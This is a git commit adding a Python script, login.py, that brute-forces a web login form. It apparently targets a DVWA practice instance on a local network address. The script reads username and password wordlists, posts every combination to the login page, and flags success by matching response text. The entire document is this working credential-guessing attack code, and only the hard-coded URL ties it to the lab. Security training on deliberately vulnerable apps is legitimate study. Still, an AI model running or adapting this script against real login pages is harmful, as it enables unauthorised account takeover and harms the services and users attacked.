85a72ca62d786698b0ba4fd65527be41cdd64155
Ehsan Jahanara <ehsan.jnra@gmail.com>
2025-04-18 18:45:22 +0330

    bruteforce login with username password files

---
+++ login.py
@@ -0,0 +1,37 @@
+import requests
+
+url = "http://192.168.1.5/dvwa/login.php"
+error= "Login failed"
+success= "Welcome"
+
+def load():
+    global usernames
+    global passwords
+    usernames = open('username.txt','r').readlines()
+    passwords = open('password.txt','r').readlines()
+
+def brute_force():
+    load()
+    for username in usernames:
+        for password in passwords:
+            data = {
+                'username': username.strip(),
+                'password': password.strip(),
+                'Login': 'Login'
+            }
+            login(data)
+    
+def login(data):
+    session = requests.Session()
+    response = session.post(url, data=data)
+    print("Status Code:", response.status_code)
+    print("Response URL:", response.url)
+
+    if(error in response.text):
+        print("failed")
+    elif(success in response.text):
+        print("success")
+    else:
+        print(response.content)
+    
+brute_force()
